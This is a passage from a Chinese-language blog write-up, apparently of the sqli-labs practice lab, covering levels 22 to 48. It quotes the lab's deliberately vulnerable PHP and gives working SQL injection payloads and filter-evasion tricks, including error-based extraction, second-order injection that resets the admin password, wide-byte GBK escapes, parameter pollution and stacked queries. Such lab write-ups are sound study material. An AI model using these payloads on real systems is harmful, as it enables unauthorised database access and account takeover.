&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230717150449907.png"></p><p><img src="/2023/02/09/SQLI/image-20230717150514301.png"></p><h4 id="level22："><a href="#level22：" class="headerlink" title="level22："></a>level22：</h4><p>同上题，改成双引号闭合罢了</p><p>level23：</p><p>单引号输进去报错，但是加注释报错仍然存在，看了眼源代码，注释被过滤掉了</p><p><img src="/2023/02/09/SQLI/image-20230717154027281.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><br><span class="hljs-comment">//filter the comments out so as to comments should not work</span><br><span class="hljs-variable">$reg</span> = <span class="hljs-string">&quot;/#/&quot;</span>;<br><span class="hljs-variable">$reg1</span> = <span class="hljs-string">&quot;/--/&quot;</span>;<br><span class="hljs-variable">$replace</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$reg1</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);<br></code></pre></td></tr></table></figure><p>emmm，当时的万能密码怎么说来着，<code>1&#39; or &#39;1&#39;=&#39;1</code>那会没去仔细深究为啥长这样，突然就明白了()，当存在注释符过滤时最后的’1会和原sql语句的引号闭合，保证sql语句的完整性</p><p>构造payload：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(1,(select database()))) or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br>或者用<span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;闭合后面的引号也行</span><br><span class="hljs-string">id=1&#x27;</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()))) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230717154544881.png"></p><p>这里是报错注入所以就不用太在意and、or逻辑关系</p><p>(前面报错注入做太爽了后面才注意到可以直接联合注入，无所谓，报错注入真好用)</p><h4 id="level24"><a href="#level24" class="headerlink" title="level24"></a>level24</h4><p>目前最牛的一级</p><p>代码审计</p><p>源代码大致有主页、修改密码、注册新用户页面。看到存在<code>mysql_escape_string()</code>过滤函数存在，开始搜寻不存在过滤的变量</p><p>诶嘿，这不是就传入了个SESSION没有过滤吗</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#pass_change.php</span><br><br><span class="hljs-comment"># Validating the user input........</span><br><span class="hljs-variable">$username</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>];<br><span class="hljs-variable">$curr_pass</span>= <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;current_password&#x27;</span>]);<br><span class="hljs-variable">$pass</span>= <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$re_pass</span>= <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>并且下面的查询语句就是对<code>$username</code>变量进行查询，只要能改变这个SESSION的值便可以间接对SQL语句进行操作，但是SESSION是存放在服务端的，客户端没法直接进行修改，不急，继续看代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#login.php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sqllogin</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>   <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<br>   <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>]);<br>   <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;<br><span class="hljs-comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br>   <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);<br>   <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_row</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-comment">//print_r($row) ;</span><br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>]) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>];<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>   &#125;<br><br>&#125;<br><br><span class="hljs-variable">$login</span> = <span class="hljs-title function_ invoke__">sqllogin</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$login</span>== <span class="hljs-number">0</span>) <br>&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>] = <span class="hljs-variable">$login</span>;<br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;Auth&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>);  <span class="hljs-comment">/* expire in 15 Minutes */</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: logged-in.php&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>从login.php这里的代码就能看出SESSION的值取决于变量$login的值，变量$login的值取决于用户在登录时的用户名(row的第一个字段)，那就慢慢变得有点头绪了，只要创建一个新用户，控制新用户用户名就能间接控制SESSION。进而达到控制数据库的目的。</p><p>逻辑理到这里了突然就卡壳了，受限于之前的惯性思维一直以为是要获取数据库中的数据，想了很久没想出个所以然来，去看了眼题解，发现这种注入被称为二次注入，当以<code>admin&#39;#</code>的身份登录后修改其密码，实际上就能修改admin的密码<img src="/2023/02/09/SQLI/66.png"></p><p>SQL语句如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;admin&#x27;#    &#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;<br></code></pre></td></tr></table></figure><p>结果是打完之后忘记<code>admin&#39;#</code>的密码了。。。等我晚上重启一下数据库。。</p><p>军训归来（，新建一个新用户<code>admin&#39;#</code><img src="/2023/02/09/SQLI/image-20230717215358223.png"></p><p>用<code>admin&#39;#</code>登录<img src="/2023/02/09/SQLI/image-20230717215500916.png"></p><p>修改其密码为114514，根据sql语句分析，此时应该修改了<code>admin</code>用户的密码<img src="/2023/02/09/SQLI/image-20230717215554491.png"></p><p>成功登录admin</p><p><img src="/2023/02/09/SQLI/image-20230717215729390.png"></p><h4 id="level25"><a href="#level25" class="headerlink" title="level25"></a>level25</h4><p>一个简单的双写过滤，payload：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=<span class="hljs-number">1</span>&#x27; anandd extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> database())))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="level26"><a href="#level26" class="headerlink" title="level26"></a>level26</h4><p>空格过滤，or and过滤，注释符过滤</p><p>注释符过滤前面提到可以通过闭合后引号解决，空格过滤在此之前只接触过&#x2F;**&#x2F;，才疏学浅，结果发现&#x2F;**&#x2F;也被过滤了（呜呜呜呜</p><p>去找了找网上的资料，如果空格被过滤了可以用如下字符替代：</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">a0</span></span>：非断行空格<br><span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span>：新建一行<br><span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span>：Tab(垂直)<br><span class="hljs-tag">%<span class="hljs-selector-tag">0c</span></span>：新的一页<br><span class="hljs-tag">%<span class="hljs-selector-tag">0d</span></span>：return<br><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span>：Tab(水平)<br></code></pre></td></tr></table></figure><p>这里%a0和%0b可行，payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">%a0anandd</span><span class="hljs-variable">%a0extractvalue</span>(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>concat(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span><span class="hljs-variable">%a0database</span>())))<span class="hljs-variable">%a0oorr</span>&#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-operator">=</span>&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>在网上看到一种神奇的写法，记个笔记：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">1&#x27;</span>||(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>))),<span class="hljs-number">1</span>))||<span class="hljs-string">&#x27;0 </span><br></code></pre></td></tr></table></figure><h4 id="level27"><a href="#level27" class="headerlink" title="level27"></a>level27</h4><p>payload：</p><p>依旧对空格过滤，但是这回上面提到的几个都行，select存在过滤，selEct大写绕过</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">%0</span>aand<span class="hljs-variable">%0</span>aupdatexml(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(concat(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(selEct<span class="hljs-variable">%0</span>adatabase())))<span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<span class="hljs-variable">%0</span>aand<span class="hljs-variable">%0</span>a&#x27;<br></code></pre></td></tr></table></figure><h4 id="level28"><a href="#level28" class="headerlink" title="level28"></a>level28</h4><p>没有报错信息，报错注入行不通了，试下盲注，空格依旧使用%0a过滤，payload：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span><span class="hljs-meta">%27</span><span class="hljs-meta">%0aand</span><span class="hljs-meta">%0alength</span>(database())=<span class="hljs-number">8</span><span class="hljs-meta">%0aor</span><span class="hljs-meta">%0a</span><span class="hljs-meta">%271</span><span class="hljs-meta">%27</span>=<span class="hljs-meta">%272</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230718004643507.png"></p><p><img src="/2023/02/09/SQLI/image-20230718004823424.png"></p><p>这里就要注意or和and之间的逻辑关系了，上面两种是正确的注入逻辑，下面两种是错误的注入逻辑</p><p><img src="/2023/02/09/SQLI/image-20230718004737058.png"></p><p><img src="/2023/02/09/SQLI/image-20230718005009949.png"></p><p>时间盲注也行，但是可以用布尔盲注为什么要用时间盲注呢（笑</p><h4 id="level29"><a href="#level29" class="headerlink" title="level29"></a>level29</h4><p>测试单引号出现报错加注释报错消失，也没有任何的过滤。。</p><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%27</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span><span class="hljs-keyword">extractvalue</span>(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>concat(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span><span class="hljs-variable">%20</span>database())))--+<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230718083706449.png"></p><p>Protected By The World’s Best Firewall。。。emmm</p><p>感觉没那么简单，看了眼源代码，咋还有个login.php和hacked.php，找遍网页也没出现这俩，手动进login.php，看起来像是隐藏关卡？</p><p><img src="/2023/02/09/SQLI/image-20230718084006936.png"></p><p>还多了两个pdf链接，应该是提示之类的，先不看，直接刚一下</p><p>测试了下单引号双引号闭合，都炸了，如下</p><p><img src="/2023/02/09/SQLI/image-20230718084437619.png"></p><p>啊？试了很久发现除了最中规中矩的纯数字，其他通通都会寄。。有点意思，那就看下源代码</p><p>有个白名单，如果传入不是纯数字就跳转到hacked.php，emmm…不急往下看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">whitelist</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$match</span> = <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^\d+$/&quot;</span>, <span class="hljs-variable">$input</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$match</span>)<br>&#123;<br><span class="hljs-comment">//echo &quot;you are good&quot;;</span><br><span class="hljs-comment">//return $match;</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: hacked.php&#x27;</span>);<br><span class="hljs-comment">//echo &quot;you are bad&quot;;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>把query_string(<code>http://host/?par1=var1&amp;par2=var2&amp;...</code>中’?’之后的部分)以’&amp;’分开然后截取每一部分的前两个字符判断是不是’id’，如果是的话截取该部分等号之后的东西。。。说了那么多，所以，不就是返回传入的参数id吗？？？？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">java_implimentation</span>(<span class="hljs-params"><span class="hljs-variable">$query_string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$q_s</span> = <span class="hljs-variable">$query_string</span>;<br><span class="hljs-variable">$qs_array</span>= <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-variable">$q_s</span>);<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$qs_array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>&#123;<br><span class="hljs-variable">$val</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$value</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$val</span>==<span class="hljs-string">&quot;id&quot;</span>)<br>&#123;<br><span class="hljs-variable">$id_value</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$value</span>,<span class="hljs-number">3</span>,<span class="hljs-number">30</span>); <br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id_value</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>嘶。。这意思是id必须是纯数字？没法子了，网页给了两个pdf，一个404了，另一个配合我的工地英语和翻译器食用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$qs</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-variable">$hint</span>=<span class="hljs-variable">$qs</span>;<br><span class="hljs-variable">$id1</span>=<span class="hljs-title function_ invoke__">java_implimentation</span>(<span class="hljs-variable">$qs</span>);<br><span class="hljs-comment">//echo $id1;</span><br><span class="hljs-title function_ invoke__">whitelist</span>(<span class="hljs-variable">$id1</span>);<br></code></pre></td></tr></table></figure><p>最后那个pdf的内容提炼出来就是这样一张表：</p><p><img src="/2023/02/09/SQLI/image-20230719171718086.png"></p><p>可以看到搭建在apache服务器上的php服务对于传入多个相同名字的参数，服务器只解析最后一个，所以<code>$_GET[&#39;id&#39;]</code>变量实际上是最后一个id参数，但是根据waf的意思，实际上过滤的是最先出现的参数id，对第二个id参数进行注入就行了</p><p><img src="/2023/02/09/SQLI/image-20230719180637741.png"></p><h3 id="level30"><a href="#level30" class="headerlink" title="level30"></a>level30</h3><p>表关卡没啥好说的，双引号闭合联合注入：</p><p><img src="/2023/02/09/SQLI/image-20230814174550933.png"></p><p>主要看里关：</p><p>同29关，HPP参数污染，把单引号换成双引号</p><h3 id="level31"><a href="#level31" class="headerlink" title="level31"></a>level31</h3><p>表关：</p><p><img src="/2023/02/09/SQLI/image-20230814182840820.png"></p><p>里关：</p><p><img src="/2023/02/09/SQLI/image-20230814182932470.png"></p><h3 id="level32"><a href="#level32" class="headerlink" title="level32"></a>level32</h3><p>直接就是把引号给转义了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-title function_ invoke__">preg_quote</span>(<span class="hljs-string">&#x27;\\&#x27;</span>) .<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&quot;\\\\\\&quot;</span>, <span class="hljs-variable">$string</span>);          <span class="hljs-comment">//escape any backslash</span><br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/\&#x27;/i&#x27;</span>, <span class="hljs-string">&#x27;\\\&#x27;&#x27;</span>, <span class="hljs-variable">$string</span>);                               <span class="hljs-comment">//escape single quote with a backslash</span><br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/\&quot;/&#x27;</span>, <span class="hljs-string">&quot;\\\&quot;&quot;</span>, <span class="hljs-variable">$string</span>);                                <span class="hljs-comment">//escape double quote with a backslash</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>通常情况下来说用户输入的字符串永远无法将原SQL语句的单引号闭合，通常情况下这里是不存在SQL注入的，但是注意到数据库使用的是GBK编码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;SET NAMES gbk&quot;</span>);<br></code></pre></td></tr></table></figure><p>宽字节的格式就是在地址后面加一个%df，再加单引号，可以通过上面的测试发现，在单引号之前PHP会自动加一个\（反斜杠），因为反斜杠的编码为%5c，所以自动转义为&#39;，而在GBK编码中，%df5c是繁体字“連”，由于汉字是双字节，所以这里’之前的\就会被吃掉消失，那么会造成单引号成功逃逸，爆出MySQL数据库的错误。</p><p><img src="/2023/02/09/SQLI/image-20230814185222764.png"></p><h3 id="level33"><a href="#level33" class="headerlink" title="level33"></a>level33</h3><p>同32</p><h3 id="level34"><a href="#level34" class="headerlink" title="level34"></a>level34</h3><p>在POST里进行宽字节注入</p><p><img src="/2023/02/09/SQLI/image-20230814223619447.png"></p><h3 id="level35"><a href="#level35" class="headerlink" title="level35"></a>level35</h3><p>虽然使用addslashes()进行了转义，但是id变量并没有用引号闭合，</p><p><img src="/2023/02/09/SQLI/image-20230814223857407.png"></p><p>主要影响到爆字段名等之后需要引号的部分：</p><p><img src="/2023/02/09/SQLI/image-20230815003116109.png"></p><p>再加上0x</p><p><img src="/2023/02/09/SQLI/image-20230815003059843.png"></p><h3 id="level36"><a href="#level36" class="headerlink" title="level36"></a>level36</h3><p>使用<code>mysql_real_escape_string()</code>函数来转义特殊字符，包括单双引号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_quotes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$string</span>= <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$string</span>);    <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230815004545376.png"></p><h3 id="level37"><a href="#level37" class="headerlink" title="level37"></a>level37</h3><p><img src="/2023/02/09/SQLI/image-20230815005104471.png"></p><h3 id="level38"><a href="#level38" class="headerlink" title="level38"></a>level38</h3><p>正常单引号闭合注入ok，感觉没那么容易去看了眼源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-comment">/* execute multi query */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br></code></pre></td></tr></table></figure><p>是存在<code>mysqli_multi_query()</code>，可执行多条sql语句，因此也可以进行堆叠注入</p><p>插入新用户potato<img src="/2023/02/09/SQLI/image-20230815011429361.png"></p><p>查询id为999的用户：</p><p><img src="/2023/02/09/SQLI/image-20230815011528753.png"></p><h3 id="level39"><a href="#level39" class="headerlink" title="level39"></a>level39</h3><p>id无闭合，数字型，直接注入即可，也可像上题一样堆叠注入</p><h3 id="level40"><a href="#level40" class="headerlink" title="level40"></a>level40</h3><p>单引号+括号闭合，</p><p><img src="/2023/02/09/SQLI/image-20230815012201662.png"></p><p>源代码里混入了level24的二次注入？</p><h3 id="level41"><a href="#level41" class="headerlink" title="level41"></a>level41</h3><p>数字型，但是可以堆叠注入</p><p><img src="/2023/02/09/SQLI/image-20230815012626998.png"></p><h3 id="level42"><a href="#level42" class="headerlink" title="level42"></a>level42</h3><p><img src="/2023/02/09/SQLI/image-20230815021217636.png"></p><p>点开忘记密码：</p><p><img src="/2023/02/09/SQLI/image-20230815021236797.png"></p><p>点开新用户：<img src="/2023/02/09/SQLI/image-20230815021258728.png"></p><p>emmm，结合源代码，堆叠注入没跑了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">if</span> (@<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br></code></pre></td></tr></table></figure><p>注意username被转义，可以利用password</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>];<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230815022717060.png"></p><p>登陆成功</p><p><img src="/2023/02/09/SQLI/image-20230815022744676.png"></p><h3 id="level43"><a href="#level43" class="headerlink" title="level43"></a>level43</h3><p>同上题，只是闭合方式换成了单引号括号：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="hljs-subst">$username</span>&#x27;) and password=(&#x27;<span class="hljs-subst">$password</span>&#x27;)&quot;</span>;<br><span class="hljs-keyword">if</span> (@<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br></code></pre></td></tr></table></figure><h3 id="level44"><a href="#level44" class="headerlink" title="level44"></a>level44</h3><p>同level42</p><p><img src="/2023/02/09/SQLI/image-20230815023355034.png"></p><h3 id="level45"><a href="#level45" class="headerlink" title="level45"></a>level45</h3><p>同43</p><h3 id="level46"><a href="#level46" class="headerlink" title="level46"></a>level46</h3><p>一进来这样一个页面，传入sort参数发现数据的顺序改变，推测是传入参数拼接在了order by后面，那就不能联合注入了，看了眼源代码不是用<code>multi_query()</code>，那也没办法堆叠注入了，</p><p><img src="/2023/02/09/SQLI/image-20230815215204733.png"></p><p>想了想还是用报错注入，<code>updatexml()</code></p><p><img src="/2023/02/09/SQLI/image-20230815220041006.png"></p><h3 id="level47"><a href="#level47" class="headerlink" title="level47"></a>level47</h3><p>比起上一题多了个单引号闭合：</p><p><img src="/2023/02/09/SQLI/image-20230816003152422.png"></p><h3 id="level48"><a href="#level48" class="headerlink" title="level48"></a>level48</h3><p>没有报错信息，判断为数字型，注入点在order by 后，延时注入：</p><p><img 